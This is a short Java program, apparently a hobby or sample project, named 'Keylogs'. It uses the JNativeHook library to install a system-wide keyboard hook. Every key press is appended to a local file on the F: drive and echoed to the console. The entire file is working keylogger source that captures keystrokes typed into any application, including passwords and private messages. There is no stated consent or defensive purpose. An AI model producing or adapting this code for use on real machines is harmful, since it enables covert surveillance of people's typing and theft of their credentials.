import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogs implements NativeKeyListener
{
	public static void main(String[] args) {
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		GlobalScreen.getInstance().addNativeKeyListener(new Keylogs());
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		System.out.println("Pressed  "+NativeKeyEvent.getKeyText(e.getKeyCode()));
		try {
			
			FileWriter fw=new FileWriter("F:\\keylogs.txt" , true);
			fw.write("  "+NativeKeyEvent.getKeyText(e.getKeyCode())+"  ");
			fw.close();
			System.out.println("Updated");
		} catch (IOException e1) {
			// TODO Auto-generated catch block saravanan1311
			e1.printStackTrace();
			System.out.println(e1);
		}
		
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
}
